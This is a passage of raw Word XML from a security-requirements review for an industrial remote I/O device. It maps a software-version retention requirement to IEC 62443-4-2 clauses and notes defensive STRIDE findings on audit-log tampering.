              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00BA40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00171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42658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 xml:space="preserve">The deficiency is </w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>absence of the version-history event class</w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>, not merely capacity.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="009E77F2" w14:paraId="6B447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21C3C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 xml:space="preserve">CR 2.11 – </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Timestamps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1FA46" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00BA4097">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:t>➕</w:t>
            </w:r>
            <w:r w:rsidRPr="00BA4097">
              <w:t xml:space="preserve"> (I </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t>added</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA409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B060E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Decisive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40A85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 xml:space="preserve">"5 years </w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>after each upload</w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>" is intrinsically per-upload time-anchored; no RTC (SRIO-15398).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="009E77F2" w14:paraId="40E80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6B2A6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t>CR 2.10 – Response to audit processing failure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05BC1" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00BA4097">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:t>➕</w:t>
            </w:r>
            <w:r w:rsidRPr="00BA4097">
              <w:t xml:space="preserve"> (I </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t>added</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA409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CBF99" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00BA4097"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F2B2D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Overflow/overwrite deficiency (shared with RQ-012).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="009E77F2" w14:paraId="727D5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2BA95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 xml:space="preserve">CR 3.9 – </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Protection</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA4097">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>of</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA4097">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>audit</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA4097">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>information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C9D33" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00BA4097">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:t>➕</w:t>
            </w:r>
            <w:r w:rsidRPr="00BA4097">
              <w:t xml:space="preserve"> (I </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t>added</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA409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79AC7" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00BA4097">
              <w:t>Keep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97153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Tamper-evidence/durability — your "not tamper-evident" point.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="00BA4097" w14:paraId="132C8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374F4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 xml:space="preserve">CR 6.1 – Audit-log </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>accessibility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A8916" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00BA4097">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>➕</w:t>
            </w:r>
            <w:r w:rsidRPr="00BA4097">
              <w:t xml:space="preserve"> (I </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:lastRenderedPageBreak/>
              <w:t>added</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA409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49DFAB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lastRenderedPageBreak/>
              <w:t>Partially</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA4097">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> 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67252" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00BA4097">
              <w:t xml:space="preserve">Current </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t>version</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t xml:space="preserve"> IoT-</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t>readable</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t xml:space="preserve">; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:rPr>
                <w:i/>
                <w:iCs/>
              </w:rPr>
              <w:t>history</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t xml:space="preserve"> + </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:rPr>
                <w:i/>
                <w:iCs/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>retention</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t xml:space="preserve"> fail.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2F398B8D" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Corrected</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>mapping</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BA4097">
        <w:t xml:space="preserve"> RQ-013 → EHSR 1.1.9 §3 (SW-version </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BA4097">
        <w:t>retention</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BA4097">
        <w:t>) →</w:t>
      </w:r>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>{CR 2.8, CR 2.9, CR 2.10, CR 2.11 [</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>decisive</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>], CR 3.9 [</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>tamper-evidence</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>durability</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>], CR 6.1 [</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>current</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">-version </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>accessibility</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> — partial]}</w:t>
      </w:r>
      <w:r w:rsidRPr="00BA4097">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">(General-log </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>retention</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>properties</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> → RQ-012; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>the</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>upload</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>event</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> → RQ-008.)</w:t>
      </w:r>
      <w:r w:rsidRPr="00BA4097">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId321" w:history="1">
        <w:r w:rsidRPr="00BA4097">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve">[IEC62443_4_2_source | </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00BA4097">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Txt</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00BA4097">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00BA4097">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId322" w:history="1">
        <w:r w:rsidRPr="00BA4097">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00BA4097">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00BA4097">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4DAB5F9D" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BA4097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871"/>
        <w:gridCol w:w="6297"/>
      </w:tblGrid>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="00BA4097" w14:paraId="2DA66C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7FD723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6D3008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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Your</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA4097">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097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D88657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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Verdict</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="00BA4097" w14:paraId="3D572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D73D7" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00BA4097">
              <w:t>Asset I – Audit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1FD4A" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00BA40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EAEDD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t>Correct</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t>primary</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="009E77F2" w14:paraId="223FE2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D7AAB" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00BA4097">
              <w:t xml:space="preserve">Asset D – </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t>Safety</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t xml:space="preserve"> Software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7D03B" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00BA409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C46AA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Correct — the versions being tracked.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="009E77F2" w14:paraId="13D33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C431E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 xml:space="preserve">Asset F – Domain </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>separation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78050" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00BA4097">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:t>➕</w:t>
            </w:r>
            <w:r w:rsidRPr="00BA4097">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t>note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22933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Version data served by the non-safety COM; SCPU versions cross SysCom — a safety-critical retention obligation on a QM component.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="29C401F1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b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>STRIDE:</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>✅</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Repudiation (primary)</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> + </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>➕</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Tampering-on-audit</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — no per-device tamper-evident store; incidental records cold-start-cleared (MITRE ATT&amp;CK for ICS </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>T0872</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>). No change.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F8B4A6C" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="009E77F2" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>1.3 Security Functions &amp; Gaps — Cross-Referenced</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DB30332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>Your mitigation list is accurate; the "device generates but discards" framing is retained and correctly attributed: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405"/>
        <w:gridCol w:w="4046"/>
      </w:tblGrid>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="00BA4097" w14:paraId="4629C3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8E9FEE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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097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A5697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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Documentation</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA4097">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097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F88C43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Note</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="009E77F2" w14:paraId="1D5CA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BB178" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00BA4097">
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t>deviceinfo</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t>swrevision</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t>, /</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t>firmware</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t>version</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t xml:space="preserve">, I&amp;M0 SOFTWARE_REVISION, I&amp;M5 </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t>annotation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41ED6" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00BA4097">
              <w:t>SRIO-2946/2953/3015/3023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FD434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t>Current</w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> version only (your point </w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">) </w:t>
            </w:r>
            <w:hyperlink r:id="rId323" w:history="1">
              <w:r w:rsidRPr="009E77F2">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>[209_SRIO_C...e_RemoteIO | PDF]</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="009E77F2" w14:paraId="483B8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6960A" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00BA4097">
              <w:t>Release Notes per release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6B29C" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00BA4097">
              <w:t>SRIO-16242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ECE43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 xml:space="preserve">External, not per-device/serial/timestamped (your point </w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">) </w:t>
            </w:r>
